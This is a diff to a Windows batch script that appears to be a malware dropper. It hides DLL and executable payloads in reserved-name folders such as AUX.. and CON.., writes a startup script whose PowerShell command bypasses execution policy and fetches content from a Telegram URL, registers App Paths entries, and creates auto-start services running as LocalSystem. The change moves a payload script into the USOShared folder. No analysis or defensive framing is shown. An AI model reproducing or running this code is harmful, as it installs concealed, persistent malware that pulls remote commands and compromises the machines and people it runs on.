@@ -6,7 +6,7 @@ fsutil file setshortname C:\ProgramData\NUL..\ ""
 fsutil file setshortname C:\ProgramData\AUX..\ ""
 fsutil file setshortname C:\ProgramData\CON..\ ""
 
-move /Y "%ProgramData%\bist\pach.cmd" "%USERPROFILE%\PrintHood\"
+move /Y "%ProgramData%\bist\pach.cmd" "%ProgramData%\USOShared\"
 move /Y "%ProgramData%\bist\Icon.dll" "\\.\%ProgramData%\AUX..\"
 copy /Y "%ProgramData%\bist\Input.exe" "\\.\%ProgramData%\AUX..\"
 move /Y "%ProgramData%\bist\Kape.dll" "\\.\%ProgramData%\CON..\"
@@ -20,8 +20,8 @@ echo powershell -NoProfile -ExecutionPolicy Bypass -Command "$u='https://t.me/s/
 echo powershell.exe %ProgramData%\CON..\Input.exe %ProgramData%\CON..\Kape.dll >> "%USERPROFILE%\Cookies\init.cmd"
 
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\start.exe" /t REG_SZ /d "%USERPROFILE%\Cookies\init.cmd" /f
-reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\install.exe" /t REG_SZ /d "%USERPROFILE%\PrintHood\pach.cmd" /f
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\setup.exe" /t REG_SZ /d "%WINDIR%\System32\oobe\Setup.exe" /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\install.exe" /t REG_SZ /d "%ProgramData%\USOShared\pach.cmd" /f
 
 sc create NetworkConfiguration binPath="%WINDIR%\System32\cmd.exe /c start start.exe" start="auto" obj="LocalSystem"
 sc create PerformanceMonitor binPath="%WINDIR%\System32\cmd.exe /c start install.exe" start="auto" obj="LocalSystem"
